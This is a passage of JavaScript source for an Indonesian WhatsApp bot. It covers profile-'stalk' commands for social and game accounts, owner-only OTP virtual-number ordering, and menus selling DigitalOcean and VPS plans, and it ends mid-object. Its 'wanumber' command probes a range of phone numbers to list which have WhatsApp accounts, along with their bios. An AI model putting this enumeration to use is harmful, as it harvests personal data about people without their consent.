				var caption = `乂 *P B - S T A L K*\n\n`
				caption += `   ◦  ID : ${anu.result.gameId}\n`
				caption += `   ◦  Username : ${anu.result.userName}\n\n`
				caption += `${footer}`
			    RezzHost.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
			}
			break
case 'mlstalk': {
			if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
			reply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${apikey}`)
			caption = `乂 M L - S T A L K\n\n   ◦  *Username*: ${data.result}\n\n${footer}`
			RezzHost.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
			}
			break
case 'stalktiktok': {
if (isBan) return reply2(mess.ban)
await loading()
if (!text) return reply(`Example: ${prefix + command} bulansutena`)
let dj = await fetchJson(`https://api.yanzbotz.my.id/api/stalker/tiktok?username=${text}`)
data = dj.result
var caption = `乂 T I K T O K - S T A L K\n\n`
caption += `   ◦  Username : ${data.username}\n`
caption += `   ◦  Nickname : ${data.name}\n`
caption += `   ◦  Followers : ${data.followers}\n`
caption += `   ◦  Followings : ${data.followings}\n`
caption += `   ◦  Likes : ${data.likes}\n`
caption += `   ◦  Bio : ${data.desc}\n\n`
caption += `${footer}`
RezzHost.sendMessage(from, { image: { url: data.profile }, caption })
}
break
case 'animestalk': {
if (!text) return reply(`Which anime are you lookin for?`)
reply(mess.search)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `乂 A N I M E - S T A L K

   ◦  *Title: ${anime.title}*
   ◦  *Type: ${anime.type}*
   ◦  *Premiered on: ${anime.premiered}*
   ◦  *Total Episodes: ${anime.episodes}*
   ◦  *Status: ${anime.status}*
   ◦  *Genres: ${anime.genres}
   ◦  *Studio: ${anime.studios}*
   ◦  *Score: ${anime.score}*
   ◦  *Rating: ${anime.rating}*
   ◦  *Rank: ${anime.ranked}*
   ◦  *Popularity: ${anime.popularity}*
   ◦  *Trailer: ${anime.trailer}*
   ◦  *URL: ${anime.url}*
   ◦  *Description:* ${anime.synopsis}*

${footer}`
RezzHost.sendMessage(m.chat, {
text: animetxt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botname,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
                }
                break
case 'genshinchar': {
if (!text) return reply(`Which genshin are you lookin for?`)
reply2(mess.search)
try {
const genshin = require("genshin-api")
const anime = await genshin.Characters(text)
let txt = `乂 G E N S H I N - C H A R\n\n`
txt += `   ◦  *Name:* ${anime.name}\n`
txt += `   ◦  *Title:* ${anime.title}\n`
txt += `   ◦  *Vision:* ${anime.vision}\n`
txt += `   ◦  *Weapon:* ${anime.weapon}\n`
txt += `   ◦  *Gender:* ${anime.gender}\n`
txt += `   ◦  *Nation:* ${anime.nation}\n`
txt += `   ◦  *Affiliation:* ${anime.affiliation}\n`
txt += `   ◦  *Rarity:* ${anime.rarity}\n`
txt += `   ◦  *Constellation:* ${anime.constellation}\n`
txt += `   ◦  *Description:* ${anime.description}\n`
txt += `   ◦  *Url:* https://genshin-impact.fandom.com/wiki/${q}\n\n`
txt += `${footer}`
RezzHost.sendMessage(m.chat, {
                        text: txt,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `ᴋ ᴀ ʏ ʏ  ʙ ᴏ ᴛ ᴢ`,
                                body: '',
                                thumbnailUrl: `https://api.genshin.dev/characters/${q}/portrait`,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
} catch (err) {
console.log(err)
return reply('Error')
}
}
break
case 'genshin':
			if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
			reply('proses kak')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${args[0]}?apikey=${apikey}`)
			var caption = `乂 G E N S H I N\n\n`
			caption += `   ◦  Name : ${data.result.title}\n`
			caption += `   ◦  Intro : ${data.result.intro}\n`
			caption += `   ◦  Icon : ${data.result.icon}\n\n`
			caption += `${footer}`
			await RezzHost.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption })
			await RezzHost.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			break
case 'enka': case 'profilgi':
			if (args.length == 0) return reply(`Example: ${prefix + command} 809005073`)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption = `▧「 *P R O F I L E  G E N S H I N* 」\n\n   ◦  *Nickname* : *${data.playerInfo.nickname}*\n`
				caption += `   ◦  *Adventure Rank* : *${data.playerInfo.level}*\n`
				caption += `   ◦  *Signature* : *${data.playerInfo.signature}*\n`
				caption += `   ◦  *World Level* : *${data.playerInfo.worldLevel}*\n`
				caption += `   ◦  *Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption += `   ◦  *Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption += `▧ *Mau Lebih Lengkap? Cek Disini :*\nhttps://enka.network/u/${args[0]}\n\n`
				caption += `${footer}`
				reply(caption)
			})
			.catch(console.error)
			break
case 'npmstalk':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} xeonapi`)
reply(mess.search)
eha = await npmstalk.npmstalk(q)
caption = `乂 *N P M - S T A L K*

   ◦  Name : ${eha.name}
   ◦  Version Latest : ${eha.versionLatest}
   ◦  Version Publish : ${eha.versionPublish}
   ◦  Version Update : ${eha.versionUpdate}
   ◦  Latest Dependencies : ${eha.latestDependencies}
   ◦  Publish Dependencies : ${eha.publishDependencies}
   ◦  Publish Time : ${eha.publishTime}
   ◦  Latest Publish Time : ${eha.latestPublishTime}

${footer}`
RezzHost.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
}
break
case 'ffstalk':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} 946716486`)
reply(mess.search)
eeh = await fetchJson(`https://api.betabotz.eu.org/api/stalk/ff?id=${q}&apikey=${btbApi}`)
caption = `乂 *F F - S T A L K*

   ◦  Id : ${text}
   ◦  Nickname : ${eeh.result.userNameGame}


${footer}`
RezzHost.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `F R E E F I R E - S T A L K`,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
}
break
case 'telegramstalk':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :${prefix+command} RezzHosteloper`)
reply(mess.search)
await sleep(1000)
let tel = await fetchJson(`https://itzpire.site/stalk/telegram-user?username=${text}`)
let nama = `乂 *T E L E G R A M - S T A L K*

   ◦  Name :  ${tel.data.name}
   ◦  Username : ${tel.data.username}
   ◦  Bio : ${tel.data.bio}

${footer}
`
RezzHost.sendMessage(m.chat, {
text: nama,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `T E L E G R A M - S T A L K`,
body: '',
thumbnailUrl: tel.data.photo,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'igstalk':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :${prefix+command} rijalsavior`)
reply(mess.search)
await sleep(1000)
fetchJson(`https://api.lolhuman.xyz/api/stalkig/${q}?apikey=${apikey}`)
.then(ig_res => {
let nama = `乂 *I G - S T A L K*

   ◦  Username:  ${ig_res.result.username}
   ◦  FullName: ${ig_res.result.fullname}
   ◦  Postingan: ${ig_res.result.posts}
   ◦  Followers: ${ig_res.result.followers}
   ◦  Following: ${ig_res.result.following}
   ◦  Bio: ${ig_res.result.bio}

${footer}
`
RezzHost.sendMessage(m.chat, {
text: nama,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `I G - S T A L K`,
body: '',
thumbnailUrl: ig_res.result.photo_profile,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}).catch((err) => {
reply('Terjadi Kesalahan!!\nUrl tidak valid')
})
}
break
case 'ghstalk': case 'githubstalk':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} DGXeon`)
reply(mess.search)
aj = await githubstalk.githubstalk(`${q}`)
RezzHost.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`乂 *G I T H U B - S T A L K*

   ◦  Username : ${aj.username}
   ◦  Nickname : ${aj.nickname}
   ◦  Bio : ${aj.bio}
   ◦  Id : ${aj.id}
   ◦  Nodeid : ${aj.nodeId}
   ◦  Url Profile : ${aj.profile_pic}
   ◦  Url Github : ${aj.url}
   ◦  Type : ${aj.type}
   ◦  Admin : ${aj.admin}
   ◦  Company : ${aj.company}
   ◦  Blog : ${aj.blog}
   ◦  Location : ${aj.location}
   ◦  Email : ${aj.email}
   ◦  Public Repo : ${aj.public_repo}
   ◦  Public Gists : ${aj.public_gists}
   ◦  Followers : ${aj.followers}
   ◦  Following : ${aj.following}
   ◦  Created At : ${aj.ceated_at}
   ◦  Updated At : ${aj.updated_at}
  
${footer}` }, { quoted: kalgans } )
}
break
case 'twstalk':
if (args.length == 0) return reply(`Example: ${command} jokowi`)
username = args[1]
ini_result = await fetchJson(`https://api.xfarr.com/api/stalking/twitter?apikey=${xfarApi}&username=${text}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.profile)
ini_txt = `乂 *T W - S T A L K*\n\n`
ini_txt += `   ◦  Username : ${ini_result.username}\n`
ini_txt += `   ◦  Name : ${ini_result.nickname}\n`
ini_txt += `   ◦  Joined : ${ini_result.join_at}\n`
ini_txt += `   ◦  Followers : ${ini_result.followers}\n`
ini_txt += `   ◦  Following : ${ini_result.following}\n`
ini_txt += `   ◦  Media : ${ini_result.media_count}\n`
ini_txt += `   ◦  Tweet : ${ini_result.tweets_count}\n`
ini_txt += `   ◦  Biography : ${ini_result.biography}\n\n`
ini_txt += `${footer}`
await RezzHost.sendMessage(m.chat, { image: ini_buffer, caption: ini_txt }, { quoted: kalgans})                  
break


// BATAS STALK MENU


// OTP MENU


let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`

case 'wanumber': case 'neednokos': case 'nokoswa':{
if (!isCreator) return reply(`Khusus Rerez Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await RezzHost.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await RezzHost.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'order':{
if (!isCreator) return (`Ngapain ? Khusus Rerez Aja !!`)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(teks_format)
var resp = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (resp.success == false) return reply(resp.data.messages)
reply(resp.data.message)
await sleep(1000)
let ress = resp.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}

• info selengkapnya
silahkan ketik .getorder`)
}
break
case 'getorder':{
if (!isCreator) return (`Ngapain ? Khusus Rerez Aja !!`)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(teks_format2)
var resu = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (resu.success == false) return reply(resu.data.messages)
reply(resu.data.message)
await sleep(1000)
let ress = resu.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}`)
}
break
case 'profile':{
if (!isCreator) return (`Ngapain ? Khusus Owner !!`)
let kode = await fetchJson(`${global.domainotp}/get-profile/${apikeyotp}`)
if (kode.succes == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*GET PROFILE*
- Username: ${res.username}
- Saldo: Rp${res.saldo}
- Email: ${res.email}`
reply(teks)
}
break
case 'layanan':{
if (!isCreator) return (`Ngapain ? Khusus Kayy Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-services/${apikeyotp}`)
if (kode.succes == false) return reply2(kode.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.order id_layanan\n\n*Contoh:* .order 14\n\n*List Layanan Kode Otp*\n\n'
let GG = 0
for (let x of kode.data.data){
teks +=`- ID layanan: ${x.id}\n- Name: ${x.name}\n- Harga: Rp${toRupiah(x.price)}\n\n`
}
reply(teks)
}
break


// BATAS OTP MENU







// STORE MENU
case 'list-do': {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ''
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: wm
}),
header: proto.Message.InteractiveMessage.Header.create({
title: Styles(`*SILAHKAN PILIH SALAH SATU LIST DIGITAL OCEAN BERIKUT*`),
subtitle: "rorr",
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/92e571a670b37c1405ab1.jpg' } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"STANDAR QUALITY\",\"id\":\".do-std\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"HIGH KUALITY\",\"id\":\".do-high\"}"
},
 ],
 })
 })
 }
 }
}, {})
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'do-std': {   
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/92e571a670b37c1405ab1.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST DIGITAL OCEAN BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*DO 3 DROP*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> DROPLET : 3 DROP
> TYPE DO : STANDAR QUALITY

> (IDR) Rp 140.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+DO+3+DROP*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*DO 10 DROP*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> DROPLET : 10 DROP
> TYPE DO : STANDAR QUALITY

> (IDR) Rp 180.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+DO+10+DROP+STANDAR+QUALITY*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'do-high': {   
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/92e571a670b37c1405ab1.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST DIGITAL OCEAN BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*DO 3 DROP*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> DROPLET : 3 DROP
> TYPE DO : STANDAR QUALITY

> (IDR) Rp 170.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+DO+3+DROP+HIGH+KUALITY*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*DO 10 DROP*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> DROPLET : 10 DROP
> TYPE DO : HIGH QUALITY

> (IDR) Rp 210.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+DO+10+DROP+HIGH+QUALITY*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'list-vps': {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ''
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: wm
}),
header: proto.Message.InteractiveMessage.Header.create({
title: Styles(`*SILAHKAN PILIH SALAH SATU LIST VPS BERIKUT*`),
subtitle: "rorr",
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://pomf2.lain.la/f/tp5id7o6.jpeg' } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"VPS REGULAR\",\"id\":\". vps-regular\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"VPS PREMIUM INTEL\",\"id\":\".vps-intel\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"VPS PREMIUM AMD\",\"id\":\".vps-amd\"}"
},
 ],
 })
 })
 }
 }
}, {})
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'vps-regular': {   
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/tp5id7o6.jpeg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST VPS REGULAR BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> RAM : 500 MB / 0,5 GB
> CPU : 1 CORE

> (IDR) Rp 7.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+1*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> RAM : 1000 MB / 1 GB
> CPU : 1 CORE

> (IDR) Rp 12.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+2*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> RAM : 2000 MB / 2 GB
> CPU : 2 CORE

> (IDR) Rp 17.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+3*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}
  
> RAM : 4000 MB / 4 GB
> CPU : 2 CORE

> (IDR) Rp 30.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+4*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 5 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 2 CORE

> (IDR) Rp 35.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+5*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 6 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 4 CORE

> (IDR) Rp 40.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+6*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS REGULAR*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 7 ] </>${gris}

> RAM : 16000 MB / 16 GB
> CPU : 4 CORE

> (IDR) Rp 60.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+REGULAR+PAKET+7*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'vps-intel': {   
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/tp5id7o6.jpeg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST VPS PREMIUM INTEL BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> RAM : 500 MB / 0,5 GB
> CPU : 1 CORE

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+1*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> RAM : 1000 MB / 1 GB
> CPU : 1 CORE

> (IDR) Rp 15.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+2*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> RAM : 2000 MB / 2 GB
> CPU : 2 CORE

> (IDR) Rp 20.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+3*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

  
> RAM : 4000 MB / 4 GB
> CPU : 2 CORE

> (IDR) Rp 35.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+4*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 5 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 2 CORE

> (IDR) Rp 40.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
